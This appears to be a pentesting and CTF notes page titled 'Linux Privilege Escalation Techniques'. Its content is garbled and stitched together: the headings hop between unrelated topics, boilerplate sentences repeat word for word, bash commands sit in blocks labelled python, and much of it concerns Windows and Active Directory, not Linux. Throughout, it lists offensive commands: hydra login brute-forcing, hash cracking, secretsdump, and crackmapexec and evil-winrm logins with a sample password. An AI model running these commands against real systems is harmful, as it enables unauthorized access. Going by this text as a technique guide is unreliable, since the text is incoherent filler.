---
TitleSEO: "Linux Privilege Escalation Techniques | ZureFX"
TitlePost: "Linux Privilege Escalation Techniques"
Author: "ZureFX"
Description: "Personal notes on Linux Privilege Escalation Techniques. Quick reference for pentesting and CTF challenges."
Keywords: "networking, windows, enumeration, privilege escalation, persistence, oscp"
URL: "https://zurefx.github.io/notes/note-linux-privilege-escalation-techniques-816.html"
URL_IMAGES: ""
Date: "2025-04-09"
Tags: "Networking, Windows, Enumeration, Privilege Escalation, Persistence, OSCP"
Section: "notes"
Lang: "en"
main_img: "note-linux-privilege-escalation-techniques-816"
Permalink: "/notes/note-linux-privilege-escalation-techniques-816.html"
BtnLabel: "Read Notes"
Pick: 0
---
## SeImpersonatePrivilege

### enum4linux

Command injection was possible through unsanitized user input in the search functionality. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Token impersonation allowed elevation to SYSTEM privileges on the target.

```python
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.29.249.151/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.81.46.197 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.90.107.177
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.42.156.174 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.111.76.69 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.97.33.153 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Ubuntu 20.04

### LAPS Abuse

The service account had excessive permissions assigned in Active Directory. Lateral movement was facilitated by reusing discovered credentials across services. The application stored sensitive credentials in an unencrypted configuration file. Network traffic analysis revealed unencrypted communications containing user credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

- `Local File Inclusion`
- `Command Injection`
- `ligolo-ng`
- `ffuf`

```bash
gobuster dir -u http://10.68.144.229/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.68.126.70/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.126.25.96/FUZZ
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.95.200.233 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## feroxbuster

### Drupal

```bash
nmap -sCV -p3306,22,23 10.71.202.239 -oN scan.txt
crackmapexec smb 10.41.89.181 -u administrator -p 'P@ssw0rd!' --shares
```

- `Pass the Hash`
- `pwncat`
- `hydra`
- `Golden Ticket`
- `msfvenom`
- `socat`

Post-exploitation enumeration revealed a path to domain administrator privileges. Privilege escalation was possible due to misconfigured sudo permissions. The application stored sensitive credentials in an unencrypted configuration file. Command injection was possible through unsanitized user input in the search functionality.

- `Constrained Delegation`
- `socat`
- `SeImpersonatePrivilege`

## Unconstrained Delegation

### AS-REP Roasting

Initial enumeration revealed several interesting open ports on the target. Network traffic analysis revealed unencrypted communications containing user credentials. The target system was identified as running a vulnerable version of the service.

The scheduled task ran with elevated privileges and could be abused for escalation. The service was running without proper input validation, leading to injection vulnerabilities. The service was running without proper input validation, leading to injection vulnerabilities. Authentication bypass was achieved through careful manipulation of the login mechanism. Post-exploitation enumeration revealed a path to domain administrator privileges.

Initial enumeration revealed several interesting open ports on the target. The scheduled task ran with elevated privileges and could be abused for escalation.

```python
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.99.97.118 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
```

## XSS

### SSRF

> **Note:** Subdomain Takeover was identified as the primary attack vector in this scenario.

- `Unquoted Service Path`
- `NTLM Relay`
- `Resource-Based Constrained Delegation`
- `netcat`

- `wmiexec`
- `Pass the Hash`
- `Local File Inclusion`

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.88.235.14 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## NFS No Root Squash

### Django

- `Weak Service Permissions`
- `Golden Ticket`
- `Silver Ticket`
- `netcat`
- `nmap`
- `NFS No Root Squash`

- `Path Traversal`
- `Broken Access Control`
- `Writable PATH`
- `GetNPUsers`
- `smbexec`
- `dcomexec`
